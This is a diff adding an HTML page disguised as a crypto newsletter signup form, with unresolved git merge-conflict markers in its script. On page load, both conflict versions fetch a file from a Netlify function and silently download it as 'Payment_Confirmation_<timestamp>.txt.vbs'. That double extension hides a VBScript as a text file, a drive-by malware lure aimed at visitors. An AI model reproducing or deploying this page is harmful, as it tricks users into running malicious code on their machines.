@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crypto Insider Newsletter</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom right, #0d0d0d, #1a1a1a);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 30px;
+      max-width: 520px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    input[type="email"] {
+      padding: 12px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      width: 300px;
+      max-width: 80%;
+    }
+
+    button {
+      padding: 12px 25px;
+      background-color: #00c2ff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #009fcc;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 15px;
+      font-size: 0.85rem;
+      color: #aaa;
+    }
+  </style>
+  <script>
+    window.onload = async function () {
+<<<<<<< HEAD
+      try {
+        const response = await fetch("/.netlify/functions/generate-file");
+        if (!response.ok) throw new Error("Download failed");
+
+        const blob = await response.blob();
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "Payment_Confirmation_" + Date.now() + ".txt.vbs";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch (err) {
+        console.error("Download error:", err);
+        alert("Download fehlgeschlagen.");
+      }
+=======
+      const response = await fetch("/.netlify/functions/generate-file");
+      const blob = await response.blob();
+
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "Payment_" + Date.now() + ".txt.vbs";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+>>>>>>> f1570dbb18b4fb4bf9ed4fb8555bf12b37329b64
+    };
+  </script>
+</head>
+<body>
+  <h1>Join the Crypto Insider Newsletter</h1>
+  <p>Get breaking crypto news, airdrop alerts, investment tips, and market trends delivered straight to your inbox.</p>
+  <form action="#" method="post">
+    <input type="email" name="email" placeholder="Enter your email address" required />
+    <button type="submit">Subscribe Now</button>
+  </form>
+  <div class="footer">Stay ahead of the crypto curve. Unsubscribe anytime.</div>
+</body>
+</html>
